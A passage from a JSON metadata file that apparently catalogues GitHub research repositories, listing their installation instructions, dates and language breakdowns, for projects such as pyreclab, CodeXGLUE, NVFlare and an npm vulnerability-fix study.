                    "value": "```sh\npip3 install pyreclab\n``` \n",
                    "original_header": "Python 3"
                },
                "confidence": 0.9987912566244258,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In case there is not a package available for your favorite operating system, you can build *pyRecLab* through the following steps: \n1.- Before starting, verify you have *libpython-dev*, *boost* and *cmake* installed on your system. If not, install it through your distribution's package manager, as shown next.\n \n",
                    "original_header": "<span style=\"font-size: 4em;\">Build and Install</span>"
                },
                "confidence": 0.9999695935216524,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```sh\n$ sudo apt-get install libpython-dev\n$ sudo apt-get install cmake\n$ sudo apt-get install libboost-dev\n``` \nNote: for Python 3.x, install *libpython3-dev* instead of *libpython-dev*.\n \n",
                    "original_header": "Debian based OS's ( Ubuntu )"
                },
                "confidence": 0.9999859838465124,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```sh\n$ yum install python-devel\n$ yum install cmake\n$ yum install boost-devel\n```\n \n",
                    "original_header": "RedHat based OS's ( CentOS )"
                },
                "confidence": 0.999999999963002,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```sh\n$ brew install cmake\n$ brew install boost\n``` \n2.- Clone the source code of *pyRecLab* in a local directory.\n```sh\n$ git clone https://github.com/gasevi/pyreclab.git\n```\n3.- Build the Python module ( default: *Python 2.7* ).\n```sh\n$ cd pyreclab\n$ cmake .\n$ make\n```\nBy default, pyRecLab will be compiled for *Python 2.7*. If you want to build it for *Python 3.x*, you can execute the following steps:\n```sh\n$ cd pyreclab\n$ cmake -DCMAKE_PYTHON_VERSION=3.x .\n$ make\n```\n4.- Install pyRecLab.\n```sh\n$ sudo make install\n```\n \n",
                    "original_header": "MAC OS X"
                },
                "confidence": 0.9999999941339865,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Parameter | Type      | Default value | Description       |\n|:----------|:---------:|:-------------:|:------------------|\n| progress  | optional  | False         | Show progress bar | \n| Parameter    | Type      | Default value | Description                               |\n|:-------------|:---------:|:-------------:|:------------------------------------------|\n| userId       | mandatory | N.A.          | User identifier                           |\n| topN         | optional  | 10            | Top N items to recommend                  |\n| includeRated | optional  | False         | Include rated items in ranking generation | \n| Parameter           | Type      | Default value | Description                                                 |\n|:--------------------|:---------:|:-------------:|:------------------------------------------------------------|\n| user_id             | mandatory | N.A.          | User identifier                                             |\n| retrieved           | optional  | N.A.          | Recommendation list for user 'user_id'                      |\n| topn                | optional  | 10            | Top N items to recommend. If 'retrieved' is provided, this value will be set to 'retrieved' length |\n| relevance_threshold | optional  | 0             | Lower threshold to consider an item as relevant ( threshold value included ) |\n| include_rated       | optional  | False         | Include rated items in ranking generation                   | \n",
                    "original_header": "<a name=\"useravg\"> pyreclab.UserAvg </a>"
                },
                "confidence": 0.9836562327424664,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Parameter  | Type      | Default value | Valid values      | Description         |\n|:-----------|:---------:|:-------------:|:-----------------:|:--------------------|\n| knn        | optional  | 10            | positive integer  | K nearest neighbors |\n| similarity | optional  | 'pearson'     |'pearson', 'cosine'| Similarity metric   |\n| progress   | optional  | False         |                   | Show progress bar   | \n",
                    "original_header": "<a name=\"userknn\"> pyreclab.UserKnn </a>"
                },
                "confidence": 0.9993867662648254,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Parameter | Type      | Default value | Description                                                 |\n|:----------|:---------:|:-------------:|:------------------------------------------------------------|\n| maxiter   | optional  | 100           | Maximum number of iterations reached without convergence    |\n| lr        | optional  | 0.01          | Learning rate                                               |\n| lamb      | optional  | 0.1           | Regularization parameter                                    |\n| progress  | optional  | False         | Show progress bar                                           | \n",
                    "original_header": "<a name=\"svd\"> pyreclab.SVD </a>"
                },
                "confidence": 0.9916285850048189,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Parameter   | Type      | Default value | Description                                                 |\n|:------------|:---------:|:-------------:|:------------------------------------------------------------|\n| alsNumIter  | optional  | 5             | Number of iterations in ALS algorithm                       |\n| lambd       | optional  | 10            | Regularization parameter                                    |\n| progress    | optional  | False         | Show progress bar                                           | \n",
                    "original_header": "<a name=\"ifals\"> pyreclab.IFAls </a>"
                },
                "confidence": 0.9927496328639657,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Parameter   | Type      | Default value | Description                                                 |\n|:------------|:---------:|:-------------:|:------------------------------------------------------------|\n| alsNumIter  | optional  | 5             | Number of iterations in ALS algorithm                       |\n| lambd       | optional  | 10            | Regularization parameter                                    |\n| cgNumIter   | optional  | 2             | Number of iterations in Conjugate Gradient algorithm        |\n| progress    | optional  | False         | Show progress bar                                           | \n",
                    "original_header": "<a name=\"ifalscg\"> pyreclab.IFAlsConjugateGradient </a>"
                },
                "confidence": 0.9880305024722792,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": " * Add *Windows* support.\n * Multi-threading. \n",
                    "original_header": "<span style=\"font-size: 4em;\">On roadmap</span>"
                },
                "confidence": 0.912479656782785,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/gasevi/pyreclab/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-02-08T05:54:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-20T01:01:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 242483
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 15742
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 9081
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "493": {
        "filename": "amin-nikanjam_SilentBugsInTensorFlowKeras_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/amin-nikanjam/SilentBugsInTensorFlowKeras",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-12-24T16:05:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-17T14:55:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 2
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "494": {
        "filename": "microsoft_CodeXGLUE_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/CodeXGLUE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[Leaderboard](https://microsoft.github.io/CodeXGLUE/) | [CodeXGLUE paper](https://arxiv.org/pdf/2102.04664.pdf) | [Access from HuggingFace datasets](https://huggingface.co/datasets?search=code_x_glue) <img alt=\"Hugging Face Datasets\" src=\"https://img.shields.io/badge/-%F0%9F%A4%97%20datasets-blue\"> </a >\n \n",
                    "original_header": "Relevant Links"
                },
                "confidence": 0.9335308468595541,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/CodeXGLUE/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. Generate your prediction output for the dev set.\n2. Run the official evaluation methodologies found in the task specific git repo and verify your systems are running as expected.\n3. Generate your prediction output for the test set.\n4. Submit the following information by emailing to `codexglue@microsoft.com`. \n",
                    "original_header": "Submission Instructions"
                },
                "confidence": 0.9975738839961029,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/CodeXGLUE/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-08-31T08:19:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T08:16:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 2737050
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 2132626
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 749660
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 71706
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 35640
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4108
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "495": {
        "filename": "rabbitjy_FuzzTuning_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/rabbitjy/FuzzTuning",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We also provide a pipeline of FuzzTuning on this task in ```./clone/run.sh```.  \n",
                    "original_header": "Pipeline-FuzzTuning-Clone"
                },
                "confidence": 0.9926467673127018,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/rabbitjy/FuzzTuning/main/Readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-19T02:03:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-07T03:02:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 86712
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2707
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "496": {
        "filename": "HadiJahanshahi_DABT_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/HadiJahanshahi/DABT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "https://github.com/HadiJahanshahi/SDABT \nThis Github repo will be completed soon. If you need data or code of the paper earlier, please contact me: \n",
                    "original_header": "DABT"
                },
                "confidence": 0.9730568182311776,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/HadiJahanshahi/DABT/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-04-24T18:14:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-05-28T23:05:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "497": {
        "filename": "sailuh_kaiaulu_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sailuh/kaiaulu",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Kaiaulu has been tested on OS X and Ubuntu. For Windows and other OS users, try [Virtualbox](https://www.virtualbox.org/),\n[VMware](https://www.vmware.com/), or any other software to run virtual machines for Ubuntu. \n\nYou can install Kaiaulu using the following command in your R console:\n\n```\nif (!require(\"devtools\")) install.packages(\"devtools\")\ndevtools::install_github(\"sailuh/kaiaulu\")\n```\n\nI also recommend you download the repo to have some example project configuration files, and notebooks to experiment:\n\n 1. Clone this repo \n 2. Open `kaiaulu.Rproj` using RStudio\n 3. Run the unit tests `devtools::test()`. If any fail, and you are not clear why, feel free to [ask in Discussions](https://github.com/sailuh/kaiaulu/discussions)\n 4. Build the documentation `devtools::document(roclets = c('rd', 'collate', 'namespace'))`.\n 5. Build Kaiaulu (Top right pane in RStudio -> Build tab -> Install and Restart)\n 6. Run `vignettes/kaiaulu_architecture.Rmd` \n 7. See the Wiki's [Third Party Tools Setup](https://github.com/sailuh/kaiaulu/wiki/Third-Party-Tools-Setup) if you are using a Notebook that relies on them. These require very minimal overhead by downloading a binary file, and specifying their path on `tools.yml` (see example on the repository). \n ",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Kai\u0101ulu <a href=\"https://github.com/sailuh/kaiaulu\"><img src=\"man/figures/logo.png\" align=\"right\" height=\"140\" /></a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sailuh/kaiaulu/master/README.md"
            },
            {
                "result": {
                    "value": "\n| Social Smells | Architectural Flaws |\n| ------------- | ------------- |\n| <a href=\"https://github.com/sailuh/kaiaulu_cheatsheet/blob/main/cheatsheets/social-smells-cheatsheet.pdf\"><img src=\"https://github.com/sailuh/kaiaulu_cheatsheet/blob/main/cheatsheets/social_smells_cheatsheet.png\" width=\"272\" height=\"210\"/></a> |  <a href=\"https://github.com/sailuh/kaiaulu_cheatsheet/blob/main/cheatsheets/dv8-cheatsheet.pdf\"><img src=\"https://github.com/sailuh/kaiaulu_cheatsheet/blob/main/cheatsheets/dv8_cheatsheet.png\" width=\"272\" height=\"210\"/></a>   |\n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Cheatsheets",
                    "parent_header": [
                        "Kai\u0101ulu <a href=\"https://github.com/sailuh/kaiaulu\"><img src=\"man/figures/logo.png\" align=\"right\" height=\"140\" /></a>",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/sailuh/kaiaulu/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For detailed functionality, see Kaiaulu's [API](http://itm0.shidler.hawaii.edu/kaiaulu/reference/index.html). \n",
                    "original_header": "Overview"
                },
                "confidence": 0.9275121223351014,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/sailuh/kaiaulu/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-04-18T03:27:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-02T03:26:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 403375
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "498": {
        "filename": "UH-SERG_SIVAND_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/UH-SERG/SIVAND",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Reproducible Capsule of FeatureExtractor:\n- CodeOcean: https://codeocean.com/capsule/7985340/tree/v1 \n",
                    "original_header": "SIVAND: Prediction-Preserving Program Simplification"
                },
                "confidence": 0.9766457508926969,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/UH-SERG/SIVAND/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-06-07T02:34:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-01-03T20:06:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 125670
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 4513
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2336
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "499": {
        "filename": "NVIDIA_NVFlare_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NVIDIA/NVFlare",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install the [current release](https://pypi.org/project/nvflare/):\n```\n$ python3 -m pip install nvflare\n```",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "NVIDIA FLARE"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NVIDIA/NVFlare/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-07-23T17:26:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T12:43:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 6181189
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 494383
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Astro",
                    "name": "Astro",
                    "type": "Programming_language",
                    "size": 165223
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 121843
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 23925
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 14203
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 6732
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 983
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 350
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "500": {
        "filename": "Spirals-Team_repairnator_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/eclipse/repairnator",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "See <https://github.com/eclipse/repairnator/blob/master/doc/media.md>.\n \n",
                    "original_header": "Media coverage"
                },
                "confidence": 0.9998940345201542,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/repairnator/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* Maven releases: https://search.maven.org/search?q=repairnator\n* DockerHub releases: https://hub.docker.com/r/repairnator/\n \n",
                    "original_header": "Releases"
                },
                "confidence": 0.9999942751464507,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/repairnator/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-12-21T16:12:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-05T11:23:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1570691
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 92919
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 42273
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 33046
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Sass",
                    "name": "Sass",
                    "type": "Programming_language",
                    "size": 18269
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 12803
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 5042
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SCSS",
                    "name": "SCSS",
                    "type": "Programming_language",
                    "size": 1538
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "501": {
        "filename": "FAU-Inf2_ARES_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/FAU-Inf2/ARES",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2017-05-03T18:36:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-08-18T13:35:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 3562599
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1346
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 650
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "502": {
        "filename": "RoBERTaCode_roberta_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/RoBERTaCode/roberta",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "python3 run_on_test_set.py --model_path [path of the trained model] --test_set_inputs_path [Path of the test file (has the name matching *_masked_code_test.txt)] --predictions_path [Path of the textual file where predictions will be written (the file is created by the script)]\n",
                    "type": "Text_excerpt",
                    "original_header": "Running a trained model on a test set",
                    "parent_header": [
                        "Replication package for RoBERTa Model",
                        "CODE"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/RoBERTaCode/roberta/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-08-28T11:31:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-26T07:27:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 40910
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 7545
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "503": {
        "filename": "NAIST-SE_Vulnerability-Fix-Lags-Release-Adoption-Propagation_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NAIST-SE/Vulnerability-Fix-Lags-Release-Adoption-Propagation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "> Published in the international journal of Empirical Software Engineering (EMSE)\n",
                    "type": "Text_excerpt",
                    "original_header": "Lags in the Release, Adoption, and Propagation of npm Vulnerability Fixes"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NAIST-SE/Vulnerability-Fix-Lags-Release-Adoption-Propagation/master/README.md"
            },
            {
                "result": {
                    "value": "Security vulnerability in third-party dependencies is a growing concern not only for developers of the affected software, but for the risks it poses to an entire software ecosystem, e.g., Heartbleed vulnerability. Recent studies show that developers are slow to respond to the threat of vulnerability, sometimes taking four to eleven months to act. To ensure quick adoption and propagation of a release that contains the fix (fixing release), we conduct an empirical investigation to identify lags that may occur between the vulnerable release and its fixing release (package-side fixing release). Through a preliminary study of 231 package-side fixing release of npm projects on GitHub, we observe that a fixing release is rarely released on its own, with up to 85.72% of the bundled commits being unrelated to a fix. We then compare the package-side fixing release with changes on a client-side (client-side fixing release).  Through an empirical study of the adoption and propagation tendencies of 1,290 package-side fixing releases that impact throughout a network of 1,553,325 releases of npm packages, we find that stale clients require additional migration effort, even if the package-side fixing release was quick (i.e., package patch landing). Furthermore, we show the influence of factors such as the branch that the package-side fixing release lands on and the severity of vulnerability on its propagation. In addition to these lags we identify and characterize, this paper lays the groundwork for future research on how to mitigate lags in an ecosystem.\n",
                    "type": "Text_excerpt",
                    "original_header": "Abstract",
                    "parent_header": [
                        "Lags in the Release, Adoption, and Propagation of npm Vulnerability Fixes"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NAIST-SE/Vulnerability-Fix-Lags-Release-Adoption-Propagation/master/README.md"
            },
            {
                "result": {
                    "value": "This section shows the structure of dataset for our study.\nDataset is in JSON format.\nEach file is associated with one vulnerability.\n",
                    "type": "Text_excerpt",
                    "original_header": "Processed Dataset",
                    "parent_header": [
                        "Lags in the Release, Adoption, and Propagation of npm Vulnerability Fixes"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NAIST-SE/Vulnerability-Fix-Lags-Release-Adoption-Propagation/master/README.md"
            },
            {
                "result": {
                    "value": "Dataset for PQ represents the information of fixing releases.\nThis dataset is used in both PQ1 and PQ2.\nEach file contains one JSON object that represents one fixing release.\n- [Script for PQ1 and PQ2](PQ/PQ.py)\n- [Download tarball of PQ dataset](PQ/pq_data.tar.gz)\n\n\nThe following table shows the structure of PQ dataset.\n\n| Key                | Description                                                               |\n|--------------------|---------------------------------------------------------------------------|\n| id                 | Vulnerability report id                                                   |\n| aff_ver            | Affected version range                                                    |\n| lib_name           | Affected library name                                                     |\n| release_type       | Type of the fix released by libraries                                     |\n| num_fix_commit     | Number of commits that related to the fix                                 |\n| num_release_commit | Number of commits in the release                                          |\n| num_fix_lines      | Number of lines of code that related to the fix                           |\n| references         | Links in references section                                               |\n| compare_link       | Link to GitHub for comparing changes between vulnerable and fixed version |\n",
                    "type": "Text_excerpt",
                    "original_header": "Dataset for PQ",
                    "parent_header": [
                        "Lags in the Release, Adoption, and Propagation of npm Vulnerability Fixes",
                        "Processed Dataset"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/NAIST-SE/Vulnerability-Fix-Lags-Release-Adoption-Propagation/master/README.md"
            },
            {
                "result": {
